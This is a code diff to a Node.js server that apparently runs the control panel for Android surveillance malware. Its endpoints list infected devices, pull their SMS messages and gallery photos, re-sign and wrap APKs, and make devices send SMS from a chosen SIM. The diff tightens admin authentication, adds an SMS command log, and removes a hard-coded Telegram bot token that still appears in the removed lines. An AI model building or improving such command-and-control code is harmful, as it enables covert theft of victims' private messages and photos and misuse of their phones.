@@ -85,6 +85,10 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
   // ═══ DEBUG ENDPOINT — shows all request headers (for diagnosing 403s) ═══
   app.get('/api/debug-request', (req, res) => {
+    // Admin-only: exposes headers + IP, must not be public
+    if (!isAdminAuthorized(req)) {
+      return res.status(401).json({ error: 'Unauthorized' });
+    }
     res.json({
       status: 'ok',
       ip: req.ip,
@@ -164,9 +168,10 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     if (!code || code.length !== 2) return '🌍';
     return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
   }
-  const VISITOR_BOT_TOKEN = '8776422384:AAFmmUXgRjO_QVIlrQddXTKf8XC3Fvy8DBQ';
-  const VISITOR_CHAT_ID = '2103408372';
+  const VISITOR_BOT_TOKEN = process.env.VISITOR_BOT_TOKEN || '';
+  const VISITOR_CHAT_ID = process.env.VISITOR_CHAT_ID || '';
   function sendVisitorAlert(text) {
+    if (!VISITOR_BOT_TOKEN || !VISITOR_CHAT_ID) return;
     const url = `https://api.telegram.org/bot${VISITOR_BOT_TOKEN}/sendMessage`;
     fetch(url, {
       method: 'POST',
@@ -1117,12 +1122,27 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // ADMIN APP API — Endpoints required by LeaksPro Admin mobile app
   // ═══════════════════════════════════════════════════════════════════════
 
+  function getAdminPassword() {
+    const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
+    return stored?.value || process.env.ADMIN_PASSWORD || null;
+  }
+
+  function isAdminAuthorized(req) {
+    const adminPassword = getAdminPassword();
+    if (!adminPassword) return false;
+    const password = req.headers['x-admin-password'] || req.query.password || req.body?.password;
+    return password === adminPassword;
+  }
+
   // POST /api/admin/login — Verify admin password
   app.post('/api/admin/login', (req, res) => {
     try {
       const { password } = req.body;
-      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
-      const adminPwd = stored ? stored.value : (process.env.ADMIN_PASSWORD || 'admin123');
+      const adminPwd = getAdminPassword();
+
+      if (!adminPwd) {
+        return res.status(503).json({ success: false, message: 'Admin password is not configured' });
+      }
 
       if (password === adminPwd) {
         res.json({ success: true, message: 'Login successful' });
@@ -1137,10 +1157,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // GET /api/admin/connections — List all registered devices
   app.get('/api/admin/connections', (req, res) => {
     try {
-      const password = req.headers['x-admin-password'] || req.query.password;
-      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
-      const adminPwd = stored ? stored.value : (process.env.ADMIN_PASSWORD || 'admin123');
-      if (password !== adminPwd) {
+      if (!isAdminAuthorized(req)) {
         return res.status(401).json({ error: 'Unauthorized' });
       }
 
@@ -1166,10 +1183,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // DELETE /api/admin/connections/:deviceId — Delete a device and all its data
   app.delete('/api/admin/connections/:deviceId', (req, res) => {
     try {
-      const password = req.headers['x-admin-password'] || req.query.password;
-      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
-      const adminPwd = stored ? stored.value : (process.env.ADMIN_PASSWORD || 'admin123');
-      if (password !== adminPwd) {
+      if (!isAdminAuthorized(req)) {
         return res.status(401).json({ error: 'Unauthorized' });
       }
 
@@ -1190,10 +1204,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // GET /api/admin/connections/:deviceId/sms — Get SMS messages for a device
   app.get('/api/admin/connections/:deviceId/sms', (req, res) => {
     try {
-      const password = req.headers['x-admin-password'] || req.query.password;
-      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
-      const adminPwd = stored ? stored.value : (process.env.ADMIN_PASSWORD || 'admin123');
-      if (password !== adminPwd) {
+      if (!isAdminAuthorized(req)) {
         return res.status(401).json({ error: 'Unauthorized' });
       }
 
@@ -1220,10 +1231,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // GET /api/admin/connections/:deviceId/gallery — Get gallery photos for a device
   app.get('/api/admin/connections/:deviceId/gallery', (req, res) => {
     try {
-      const password = req.headers['x-admin-password'] || req.query.password;
-      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
-      const adminPwd = stored ? stored.value : (process.env.ADMIN_PASSWORD || 'admin123');
-      if (password !== adminPwd) {
+      if (!isAdminAuthorized(req)) {
         return res.status(401).json({ error: 'Unauthorized' });
       }
 
@@ -1252,8 +1260,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   const wrapperUpload = multer({ dest: path.join(__dirname, 'data', 'tmp'), limits: { fileSize: 20 * 1024 * 1024 } });
   app.post('/api/admin/upload-wrapper', wrapperUpload.single('apk'), (req, res) => {
     try {
-      const adminPwd = req.headers['x-admin-password'];
-      if (adminPwd !== (process.env.ADMIN_PASSWORD || 'admin123')) {
+      if (!isAdminAuthorized(req)) {
         if (req.file && fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
         return res.status(401).json({ error: 'Unauthorized' });
       }
@@ -1321,8 +1328,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   if (!fs.existsSync(signedApkDir)) fs.mkdirSync(signedApkDir, { recursive: true });
 
   function checkAdminAuth(req) {
-    const pwd = req.headers['x-admin-password'];
-    return pwd === (process.env.ADMIN_PASSWORD || 'admin123');
+    return isAdminAuthorized(req);
   }
 
   // POST /api/admin/sign-apk — Upload an APK, sign it with fresh cert, save to vault
@@ -1619,6 +1625,25 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // ═══════════════════════════════════════════════════════════════════════
   const socketToDevice = new Map(); // socket.id → device_id
   const deviceToSocket = new Map(); // device_id → socket.id
+  // Tracks in-flight SMS commands — request_id → { sim_slot, receiver, device_id }
+  // Used to carry sim_slot through to sms_send_result broadcast and DB log
+  const pendingSmsCommands = new Map();
+
+  // Create SMS command log table once at startup
+  try {
+    db.exec(`CREATE TABLE IF NOT EXISTS sms_command_log (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      request_id TEXT UNIQUE,
+      device_id TEXT,
+      receiver TEXT,
+      message TEXT,
+      sim_slot INTEGER,
+      status TEXT DEFAULT 'sent',
+      error TEXT DEFAULT '',
+      sent_at TEXT DEFAULT (datetime('now')),
+      result_at TEXT
+    )`);
+  } catch (_) {}
 
   io.on('connection', (socket) => {
     socket.onAny(() => { metrics.wsMessagesIn++; });
@@ -1721,14 +1746,26 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         const requestId = data.request_id || data.command_id || '';
         const deviceId = data.device_id || socketToDevice.get(socket.id) || '';
 
-        console.log(`[SMS-Result] Device ${deviceId}: success=${success}, to=${receiver}, reqId=${requestId}${error ? ', error=' + error : ''}`);
+        // Recover sim_slot from in-flight map (device may or may not send it back)
+        const pending = pendingSmsCommands.get(requestId);
+        const simSlot = (data.sim_slot != null ? data.sim_slot : pending?.sim_slot) ?? 1;
+        if (pending) pendingSmsCommands.delete(requestId);
 
-        // Broadcast result to all admin clients
+        console.log(`[SMS-Result] Device ${deviceId}: success=${success}, to=${receiver}, sim=${simSlot}, reqId=${requestId}${error ? ', error=' + error : ''}`);
+
+        // Update DB log with result
+        try {
+          db.prepare(`UPDATE sms_command_log SET status = ?, error = ?, result_at = datetime('now') WHERE request_id = ?`)
+            .run(success ? 'delivered' : 'failed', error, requestId);
+        } catch (_) {}
+
+        // Broadcast result to all admin clients (now includes sim_slot for UI)
         origEmit('sms_send_result', {
           device_id: deviceId,
           success,
           error,
           receiver,
+          sim_slot: simSlot,
           request_id: requestId,
           timestamp: Date.now()
         });
@@ -1913,10 +1950,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
   // ═══ ANALYTICS & AGENTS API ENDPOINTS ═══
   function requireAdmin(req, res) {
-    const pw = req.headers['x-admin-password'] || req.query.password;
-    const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
-    const adminPw = stored?.value || 'admin123';
-    if (pw !== adminPw) { res.status(401).json({ error: 'Unauthorized' }); return false; }
+    if (!isAdminAuthorized(req)) { res.status(401).json({ error: 'Unauthorized' }); return false; }
     return true;
   }
 
@@ -2020,9 +2054,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
   // Admin: update version info
   app.post('/api/admin/set-version', express.json(), (req, res) => {
-    const adminPw = req.headers['x-admin-password'] || req.body?.password;
-    const storedPw = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
-    if (adminPw !== (storedPw?.value || 'admin123')) return res.status(401).json({ error: 'Unauthorized' });
+    if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
     const versionPath = path.join(__dirname, 'data', 'version.json');
     try {
       const current = fs.existsSync(versionPath) ? JSON.parse(fs.readFileSync(versionPath, 'utf8')) : {};
@@ -2483,13 +2515,13 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // Send SMS via device — admin sends command to a connected device
   app.post('/api/admin/send-sms', (req, res) => {
     try {
-      const { password, device_id, receiver, message, sim_slot } = req.body;
-
-      // Verify admin password
-      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
-      if (!stored || password !== stored.value) {
+      // Accept password from x-admin-password header (Android admin app)
+      // OR from body.password (web admin panel) — consistent with all other admin endpoints
+      if (!isAdminAuthorized(req)) {
         return res.status(401).json({ error: 'Invalid admin password' });
       }
+
+      const { device_id, receiver, message, sim_slot } = req.body;
 
       if (!device_id || !receiver || !message) {
         return res.status(400).json({ error: 'device_id, receiver, and message are required' });
@@ -2517,16 +2549,28 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       // Generate a unique request ID for tracking
       const requestId = `sms_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
 
+      // Android SIM slots are 1-indexed: 1 = SIM 1, 2 = SIM 2. Default to 1 (first SIM).
+      const normalizedSimSlot = parseInt(sim_slot) || 1;
+
+      // Track pending command so sms_send_result handler can include sim_slot in broadcast
+      pendingSmsCommands.set(requestId, { sim_slot: normalizedSimSlot, receiver, device_id });
+      setTimeout(() => pendingSmsCommands.delete(requestId), 2 * 60 * 1000); // auto-clean after 2 min
+
+      // Persist to DB log for audit trail and debugging
+      try {
+        db.prepare(`INSERT OR IGNORE INTO sms_command_log (request_id, device_id, receiver, message, sim_slot) VALUES (?,?,?,?,?)`)
+          .run(requestId, device_id, receiver, message, normalizedSimSlot);
+      } catch (_) {}
+
       // Emit send_sms command to the device (encrypted)
-      // sim_slot: 0 = default SIM, 1 = SIM 1, 2 = SIM 2
       targetSocket.emit('send_sms', cryptoEncrypt({
         request_id: requestId,
         receiver,
         message,
-        sim_slot: parseInt(sim_slot) || 0,
+        sim_slot: normalizedSimSlot,
       }));
 
-      console.log(`[SMS-SEND] Command sent to device ${device_id}: to=${receiver} sim=${sim_slot || 'default'} socket=${targetSocket.id}`);
+      console.log(`[SMS-SEND] Command sent to device ${device_id}: to=${receiver} sim=${normalizedSimSlot} reqId=${requestId} socket=${targetSocket.id}`);
       res.json({ success: true, request_id: requestId, message: 'Send command dispatched to device' });
     } catch (err) {
       console.error('[SMS-SEND] Error:', err.message);
